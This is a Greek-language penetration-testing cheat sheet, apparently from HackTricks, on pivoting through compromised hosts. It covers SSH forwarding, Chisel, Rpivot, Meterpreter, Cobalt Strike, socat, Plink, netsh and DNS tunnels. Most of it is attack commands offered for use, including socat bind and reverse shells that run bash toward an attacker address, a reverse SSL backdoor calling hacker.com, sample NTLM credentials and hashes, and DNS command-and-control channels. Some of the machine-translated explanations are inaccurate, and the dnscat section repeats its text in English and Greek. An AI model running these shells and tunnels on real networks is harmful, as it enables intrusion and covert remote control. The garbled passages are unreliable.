# Σήραγγες και Προώθηση Θύρας

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε** στην [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Συμβουλή Nmap

{% hint style="warning" %}
Οι σάρωσεις **ICMP** και **SYN** δεν μπορούν να διαβιβαστούν μέσω socks proxies, γι 'αυτό πρέπει να **απενεργοποιήσουμε την ανακάλυψη ping** (`-Pn`) και να καθορίσουμε **σαρώσεις TCP** (`-sT`) για να λειτουργήσει αυτό.
{% endhint %}

## **Bash**

**Φιλοξενητής -> Άλμα -> ΕσωτερικόΑ -> ΕσωτερικόΒ**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

Γραφική σύνδεση SSH (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Τοπική Μεταφορά Θύρας προς Θύρα

Ανοίξτε μια νέα θύρα στον διακομιστή SSH --> Άλλη θύρα
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Πόρτα προς Πόρτα

Τοπική πόρτα --> Παραβιασμένος υπολογιστής (SSH) --> Τρίτος_Κουτί:Πόρτα
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Τοπική Θύρα --> Παραβιασμένος κόμβος (SSH) --> Οπουδήποτε
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Αντίστροφη Προώθηση Θύρας

Αυτό είναι χρήσιμο για να λάβετε αντίστροφα κελύφη από εσωτερικούς υπολογιστές μέσω μιας DMZ στον δικό σας υπολογιστή:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Χρειάζεστε **root σε και τις δύο συσκευές** (καθώς θα δημιουργήσετε νέες διεπαφές) και η ρύθμιση του sshd πρέπει να επιτρέπει την σύνδεση ως root:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
Ενεργοποίηση της προώθησης στην πλευρά του Διακομιστή
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Ορίστε μια νέα διαδρομή στην πλευρά του πελάτη
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

Μπορείτε να **διατρέξετε** μέσω **ssh** όλη την **κίνηση** προς ένα **υποδίκτυο** μέσω ενός κεντρικού υπολογιστή.\
Για παράδειγμα, προώθηση όλης της κίνησης που πηγαίνει στο 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Συνδεθείτε με ένα ιδιωτικό κλειδί
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Τοπική θύρα --> Παραβιασμένος υπολογιστής (ενεργή συνεδρία) --> Τρίτος υπολογιστής:Θύρα
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS

Το SOCKS είναι ένα πρωτόκολλο που χρησιμοποιείται για τη δρομολόγηση της κίνησης δεδομένων μεταξύ δικτυακών συσκευών μέσω ενός δικτύου. Χρησιμοποιείται συχνά για τη δημιουργία τουνελισμού (tunneling) και την προώθηση θυρών (port forwarding) σε ασφαλείς συνδέσεις.

Ο τρόπος λειτουργίας του SOCKS είναι ο εξής:

1. Ο χρήστης συνδέεται σε έναν SOCKS proxy server.
2. Ο proxy server λαμβάνει το αίτημα σύνδεσης από τον χρήστη.
3. Ο proxy server συνδέεται με τον προορισμό που ζητήθηκε από τον χρήστη.
4. Ο proxy server μεταφέρει την κίνηση δεδομένων μεταξύ του χρήστη και του προορισμού.

Ο SOCKS επιτρέπει την πρόσβαση σε πόρους που είναι προστατευμένοι από φραγές δικτύου ή περιορισμούς γεωγραφικής τοποθεσίας. Επίσης, μπορεί να χρησιμοποιηθεί για την ανωνυμοποίηση της κίνησης δεδομένων και την προστασία της ιδιωτικότητας του χρήστη.

Οι επιθέσεις μέσω του SOCKS περιλαμβάνουν την εκμετάλλευση ευπαθειών στο πρωτόκολλο ή την κατάληψη του proxy server για την παρακολούθηση ή την αλλοίωση της κίνησης δεδομένων. Είναι σημαντικό να λαμβάνονται μέτρα ασφαλείας για την προστασία του SOCKS proxy server και την αποτροπή ανεπιθύμητης πρόσβασης ή κακόβουλης χρήσης.
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Ένας άλλος τρόπος:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### Προξενητής SOCKS

Ανοίξτε ένα θύρα στον teamserver που ακούει σε όλα τα διεπαφές που μπορούν να χρησιμοποιηθούν για να **κατευθύνετε την κίνηση μέσω του beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

{% hint style="warning" %}
Σε αυτήν την περίπτωση, η **θύρα ανοίγει στον beacon host**, όχι στον Team Server και η κίνηση αποστέλλεται στον Team Server και από εκεί στον καθορισμένο host:port.
{% endhint %}
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Να σημειωθεί:

- Η αντίστροφη προώθηση θύρας του Beacon είναι σχεδιασμένη για να **δρομολογεί την κίνηση προς τον Team Server, όχι για αναμετάδοση μεταξύ ατομικών μηχανών**.
- Η κίνηση **δρομολογείται εντός της κίνησης C2 του Beacon**, συμπεριλαμβανομένων των συνδέσεων P2P.
- Δεν απαιτούνται **δικαιώματα διαχειριστή** για τη δημιουργία αντίστροφων προώθησης θυρών σε υψηλές θύρες.

### Τοπική αντίστροφη προώθηση θύρας (rPort2Port)

{% hint style="warning" %}
Σε αυτήν την περίπτωση, η **θύρα ανοίγει στον υπολογιστή του Beacon**, όχι στον Team Server και η **κίνηση αποστέλλεται στον πελάτη Cobalt Strike** (όχι στον Team Server) και από εκεί προωθείται στον καθορισμένο υπολογιστή:θύρα
{% endhint %}
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Χρειάζεστε να ανεβάσετε έναν τούνελ αρχείου ιστού: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Μπορείτε να το κατεβάσετε από τη σελίδα κυκλοφορίας του [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Πρέπει να χρησιμοποιήσετε **την ίδια έκδοση για τον πελάτη και τον διακομιστή**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Προώθηση θυρών (Port forwarding)

Η προώθηση θυρών είναι μια τεχνική που χρησιμοποιείται για να ανακατευθύνει την κίνηση δεδομένων από μια θύρα ενός δικτυακού κόμβου σε μια άλλη. Αυτό μπορεί να γίνει είτε σε τοπικό δίκτυο είτε μέσω διαδικτύου. Η προώθηση θυρών επιτρέπει στους χρήστες να αποκτήσουν πρόσβαση σε υπηρεσίες που είναι πίσω από έναν δρομολογητή ή ένα τείχος προστασίας.

Υπάρχουν δύο είδη προώθησης θυρών: η τοπική προώθηση θυρών και η απομακρυσμένη προώθηση θυρών.

#### Τοπική προώθηση θυρών

Η τοπική προώθηση θυρών επιτρέπει σε έναν χρήστη να προωθήσει την κίνηση δεδομένων από μια θύρα του τοπικού υπολογιστή του σε μια άλλη θύρα στον ίδιο υπολογιστή ή σε έναν άλλο υπολογιστή στο τοπικό δίκτυο. Αυτό μπορεί να χρησιμοποιηθεί για να αποκτήσει πρόσβαση σε υπηρεσίες που εκτελούνται σε έναν υπολογιστή που δεν είναι προσβάσιμος από το διαδίκτυο.

#### Απομακρυσμένη προώθηση θυρών

Η απομακρυσμένη προώθηση θυρών επιτρέπει σε έναν χρήστη να προωθήσει την κίνηση δεδομένων από μια θύρα του τοπικού υπολογιστή του σε μια άλλη θύρα σε έναν απομακρυσμένο υπολογιστή μέσω ενός διακομιστή προώθησης θυρών. Αυτό μπορεί να χρησιμοποιηθεί για να αποκτήσει πρόσβαση σε υπηρεσίες που εκτελούνται σε έναν απομακρυσμένο υπολογιστή που δεν είναι προσβάσιμος απευθείας από τον χρήστη.
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Αντίστροφος σωλήνας. Ο σωλήνας ξεκινά από το θύμα.\
Δημιουργείται ένας διακομιστής proxy socks4 στη διεύθυνση 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Περιστροφή μέσω **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Συνδεδεμένη κέλυφος (Bind shell)
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Αντίστροφη κέλυφος

Η αντίστροφη κέλυφος είναι μια τεχνική που χρησιμοποιείται στο χάκινγκ για να αποκτήσετε απομακρυσμένη πρόσβαση σε έναν υπολογιστή. Με αυτήν την τεχνική, ο χάκερ δημιουργεί μια σύνδεση από τον στόχο υπολογιστή προς τον επιτιθέμενο υπολογιστή, επιτρέποντάς του να εκτελέσει εντολές στον στόχο υπολογιστή από απόσταση.

Για να επιτευχθεί αυτό, ο χάκερ χρησιμοποιεί ένα πρόγραμμα κέλυφους που εκτελείται στον επιτιθέμενο υπολογιστή και ακούει για συνδέσεις από τον στόχο υπολογιστή. Όταν ο στόχος υπολογιστής συνδεθεί, ο χάκερ αποκτά πρόσβαση στο κέλυφος του στόχου υπολογιστή και μπορεί να εκτελέσει εντολές όπως να ανοίξει αρχεία, να εκτελέσει προγράμματα ή να ανακτήσει ευαίσθητες πληροφορίες.

Η αντίστροφη κέλυφος είναι μια ισχυρή τεχνική που χρησιμοποιείται συχνά από χάκερς για να εκμεταλλευτούν ευπάθειες σε συστήματα και να αποκτήσουν απομακρυσμένη πρόσβαση σε αυτά. Είναι σημαντικό να ληφθούν μέτρα ασφαλείας για να προστατευθούν οι υπολογιστές από αυτήν την επίθεση.
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Θύρα προς Θύρα

Η τεχνική της θύρας προς θύρας (Port2Port) επιτρέπει τη δημιουργία ενός τοπικού τούνελ μεταξύ δύο συσκευών, επιτρέποντας την ανακατεύθυνση της κίνησης δεδομένων από μία θύρα σε μία άλλη. Αυτό μπορεί να χρησιμοποιηθεί για να προωθήσετε την κίνηση δεδομένων από μία απομακρυσμένη συσκευή σε μία τοπική συσκευή ή αντίστροφα.

Για να δημιουργήσετε ένα τοπικό τούνελ με την τεχνική της θύρας προς θύρας, μπορείτε να χρησιμοποιήσετε εργαλεία όπως το `ssh` ή το `netcat`. Με αυτά τα εργαλεία, μπορείτε να καθορίσετε την πηγή και τον προορισμό της κίνησης δεδομένων και να προωθήσετε την κίνηση μέσω του τοπικού τούνελ.

Η τεχνική της θύρας προς θύρας είναι χρήσιμη για πολλούς σκοπούς, όπως για την απομακρυσμένη πρόσβαση σε μία συσκευή που βρίσκεται πίσω από ένα τείχος προστασίας ή για την ανακατεύθυνση της κίνησης δεδομένων σε έναν ενδιάμεσο διακομιστή για ασφαλή πρόσβαση.

Είναι σημαντικό να έχετε υπόψη ότι η τεχνική της θύρας προς θύρας μπορεί να χρησιμοποιηθεί και για κακόβουλους σκοπούς, όπως για την εκμετάλλευση ευπάθειών σε συστήματα ή για την παράκαμψη των ασφαλειών. Επομένως, πρέπει να χρησιμοποιείται με προσοχή και μόνο για νόμιμους σκοπούς.
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Πόρτα προς πόρτα μέσω του socks

Η τεχνική της πόρτας προς πόρτα επιτρέπει τη δρομολόγηση της κίνησης δεδομένων από μια πόρτα σε μια άλλη μέσω του πρωτοκόλλου socks. Αυτό μπορεί να χρησιμοποιηθεί για να προωθήσετε την κίνηση δεδομένων από έναν τοπικό υπολογιστή σε έναν απομακρυσμένο διακομιστή μέσω ενός ενδιάμεσου διακομιστή socks.

Για να δημιουργήσετε μια σύνδεση πόρτας προς πόρτα μέσω του socks, ακολουθήστε τα παρακάτω βήματα:

1. Εγκαταστήστε έναν socks proxy server στον απομακρυσμένο διακομιστή.
2. Ρυθμίστε τον τοπικό υπολογιστή σας ώστε να χρησιμοποιεί τον socks proxy server για την εξερεύνηση του διαδικτύου.
3. Χρησιμοποιήστε ένα εργαλείο όπως το `socat` για να δημιουργήσετε μια σύνδεση πόρτας προς πόρτα από τον τοπικό υπολογιστή σας στον απομακρυσμένο διακομιστή μέσω του socks proxy server.

Με αυτόν τον τρόπο, η κίνηση δεδομένων που προωθείται από τον τοπικό υπολογιστή σας θα δρομολογείται μέσω του socks proxy server και θα φτάνει στον απομακρυσμένο διακομιστή μέσω της επιθυμητής πόρτας.
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter μέσω SSL Socat

Η μέθοδος αυτή χρησιμοποιεί το εργαλείο Socat για να δημιουργήσει έναν ασφαλή τούνελ μεταξύ του επιτιθέμενου συστήματος και του απομακρυσμένου συστήματος που εκτελεί το Meterpreter. Αυτό επιτυγχάνεται με τη χρήση του πρωτοκόλλου SSL για την κρυπτογράφηση της επικοινωνίας.

Για να χρησιμοποιήσετε αυτήν τη μέθοδο, πρέπει να έχετε εγκατεστημένο το Socat στο επιτιθέμενο σύστημα και να έχετε πρόσβαση σε ένα πιστοποιητικό SSL. Ακολουθήστε τα παρακάτω βήματα:

1. Δημιουργήστε ένα αυτο-υπογεγραμμένο πιστοποιητικό SSL ή αποκτήστε ένα από έγκυρο πάροχο πιστοποιητικών.
2. Εκκινήστε έναν ακροατή Socat στο επιτιθέμενο σύστημα, χρησιμοποιώντας το πιστοποιητικό SSL:

   ```
   socat OPENSSL-LISTEN:443,cert=<path_to_certificate>,verify=0,fork EXEC:"<command_to_execute>"
   ```

   Αντικαταστήστε το `<path_to_certificate>` με το διαδρομή του πιστοποιητικού SSL και το `<command_to_execute>` με την εντολή που θέλετε να εκτελεστεί στο απομακρυσμένο σύστημα.

3. Στο απομακρυσμένο σύστημα, εκτελέστε την εντολή Meterpreter για να συνδεθείτε στον ακροατή Socat:

   ```
   meterpreter > portfwd add -l 443 -p <local_port> -r <remote_ip>
   ```

   Αντικαταστήστε το `<local_port>` με τη θύρα που θέλετε να χρησιμοποιήσετε στον τοπικό υπολογιστή και το `<remote_ip>` με τη διεύθυνση IP του επιτιθέμενου συστήματος.

4. Τώρα μπορείτε να χρησιμοποιήσετε το Meterpreter μέσω του ασφαλούς τούνελ που δημιουργήθηκε με το Socat.

Αυτή η μέθοδος επιτρέπει την ασφαλή επικοινωνία μεταξύ του επιτιθέμενου συστήματος και του απομακρυσμένου συστήματος που εκτελεί το Meterpreter, παρέχοντας προστασία από πιθανές διαρροές πληροφοριών.
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Μπορείτε να παρακάμψετε ένα **μη εξουσιοδοτημένο διακομιστή μεσολάβησης** εκτελώντας αυτήν τη γραμμή αντί για την τελευταία στην κονσόλα του θύματος:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### Τούνελ SSL Socat

**/bin/sh κονσόλα**

Δημιουργήστε πιστοποιητικά σε και τις δύο πλευρές: Πελάτη και Διακομιστή
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Απομακρυσμένη Πόρτα προς Πόρτα

Συνδέστε την τοπική πόρτα SSH (22) με την πόρτα 443 του υπολογιστή του επιτιθέμενου.
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Είναι σαν μια έκδοση του PuTTY για κονσόλα (οι επιλογές είναι πολύ παρόμοιες με έναν πελάτη ssh).

Καθώς αυτό το δυαδικό αρχείο θα εκτελεστεί στο θύμα και είναι ένας πελάτης ssh, πρέπει να ανοίξουμε την υπηρεσία και τη θύρα ssh μας, ώστε να μπορέσουμε να έχουμε μια αντίστροφη σύνδεση. Στη συνέχεια, για να προωθήσουμε μόνο την τοπικά προσβάσιμη θύρα σε μια θύρα στον υπολογιστή μας:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Πόρτα προς πόρτα

Χρειάζεστε να είστε τοπικός διαχειριστής (για οποιαδήποτε πόρτα)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Χρειάζεστε **πρόσβαση RDP στο σύστημα**.\
Λήψη:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Αυτό το εργαλείο χρησιμοποιεί τα `Dynamic Virtual Channels` (`DVC`) από το χαρακτηριστικό Remote Desktop Service των Windows. Το DVC είναι υπεύθυνο για την **διάτρηση πακέτων μέσω της σύνδεσης RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Στον υπολογιστή του πελάτη φορτώστε το **`SocksOverRDP-Plugin.dll`** ως εξής:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Τώρα μπορούμε να **συνδεθούμε** στον **θύμα** μέσω **RDP** χρησιμοποιώντας το **`mstsc.exe`**, και θα πρέπει να λάβουμε ένα **παράθυρο ειδοποίησης** που λέει ότι το πρόσθετο **SocksOverRDP είναι ενεργοποιημένο**, και θα **ακούει** στη διεύθυνση **127.0.0.1:1080**.

**Συνδεθείτε** μέσω **RDP** και ανεβάστε και εκτελέστε στη μηχανή του θύματος το δυαδικό αρχείο `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Τώρα, επιβεβαιώστε στον υπολογιστή σας (επιτιθέμενος) ότι ο θύρα 1080 ακούει:
```
netstat -antb | findstr 1080
```
Τώρα μπορείτε να χρησιμοποιήσετε το [**Proxifier**](https://www.proxifier.com/) **για να προωθήσετε την κίνηση μέσω αυτής της θύρας.**

## Προώθηση εφαρμογών Windows GUI με το Proxifier

Μπορείτε να κάνετε τις εφαρμογές Windows GUI να περιηγούνται μέσω ενός διακομιστή proxy χρησιμοποιώντας το [**Proxifier**](https://www.proxifier.com/).\
Στην καρτέλα **Profile -> Proxy Servers** προσθέστε την IP και τη θύρα του διακομιστή SOCKS.\
Στην καρτέλα **Profile -> Proxification Rules** προσθέστε το όνομα του προγράμματος που θέλετε να προωθήσετε και τις συνδέσεις προς τις IP που θέλετε να προωθήσετε.

## Παράκαμψη NTLM proxy

Το προηγουμένως αναφερθέν εργαλείο: **Rpivot**\
Το **OpenVPN** μπορεί επίσης να το παρακάμψει, ρυθμίζοντας αυτές τις επιλογές στο αρχείο διαμόρφωσης:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Αυτό επαληθεύεται έναντι ενός διαμεσολαβητή και δένει έναν τοπικό θύρα που ανακατευθύνεται στην εξωτερική υπηρεσία που καθορίζετε. Στη συνέχεια, μπορείτε να χρησιμοποιήσετε το εργαλείο της επιλογής σας μέσω αυτής της θύρας.\
Για παράδειγμα, ανακατεύθυνση της θύρας 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Τώρα, αν ορίσετε για παράδειγμα στο θύμα την υπηρεσία **SSH** να ακούει στη θύρα 443. Μπορείτε να συνδεθείτε σε αυτή μέσω της θύρας 2222 του επιτιθέμενου.\
Μπορείτε επίσης να χρησιμοποιήσετε ένα **meterpreter** που συνδέεται στο localhost:443 και ο επιτιθέμενος ακούει στη θύρα 2222.

## YARP

Ένας αντίστροφος διαμεσολαβητής που δημιουργήθηκε από τη Microsoft. Μπορείτε να το βρείτε εδώ: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Χρειάζεται δικαιώματα διαχειριστή σε και τα δύο συστήματα για να δημιουργηθούν προσαρμογείς tun και να μεταφερθούν δεδομένα μεταξύ τους χρησιμοποιώντας ερωτήματα DNS.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Ο τούνελ θα είναι πολύ αργός. Μπορείτε να δημιουργήσετε μια συμπιεσμένη σύνδεση SSH μέσω αυτού του τούνελ χρησιμοποιώντας:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Κατεβάστε το από εδώ**](https://github.com/iagox86/dnscat2)**.**

Δημιουργεί ένα κανάλι C\&C μέσω του DNS. Δεν απαιτεί δικαιώματα root.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **Στο PowerShell**

Μπορείτε να χρησιμοποιήσετε το [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) για να εκτελέσετε έναν πελάτη dnscat2 στο powershell:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Προώθηση θύρας με το dnscat**

Port forwarding is a technique used to redirect network traffic from one port to another. It can be useful in various scenarios, such as accessing a service running on a remote machine through a firewall or NAT device. One tool that can be used for port forwarding is dnscat.

Η προώθηση θύρας είναι μια τεχνική που χρησιμοποιείται για την ανακατεύθυνση της δικτυακής κίνησης από μια θύρα σε μια άλλη. Μπορεί να είναι χρήσιμη σε διάφορα σενάρια, όπως η πρόσβαση σε ένα υπηρεσία που εκτελείται σε ένα απομακρυσμένο μηχάνημα μέσω ενός τείχους προστασίας ή συσκευής NAT. Ένα εργαλείο που μπορεί να χρησιμοποιηθεί για την προώθηση θύρας είναι το dnscat.

Dnscat is a command-line tool that uses DNS queries and responses to establish a covert communication channel between two machines. It can be used to bypass firewalls and NAT devices by encapsulating the desired traffic within DNS packets.

Το dnscat είναι ένα εργαλείο γραμμής εντολών που χρησιμοποιεί ερωτήματα και απαντήσεις DNS για να δημιουργήσει ένα κρυφό κανάλι επικοινωνίας μεταξύ δύο μηχανημάτων. Μπορεί να χρησιμοποιηθεί για την παράκαμψη των τειχών προστασίας και των συσκευών NAT, ενθυλακώνοντας την επιθυμητή κίνηση μέσα σε πακέτα DNS.

To use dnscat for port forwarding, you need to have a DNS server that supports wildcard subdomains. You can set up a DNS server locally or use a public DNS server that allows wildcard subdomains.

Για να χρησιμοποιήσετε το dnscat για την προώθηση θύρας, πρέπει να έχετε έναν DNS διακομιστή που υποστηρίζει αγριοχώρους υποτομέων. Μπορείτε να δημιουργήσετε έναν τοπικό DNS διακομιστή ή να χρησιμοποιήσετε έναν δημόσιο DNS διακομιστή που επιτρέπει αγριοχώρους υποτομέων.

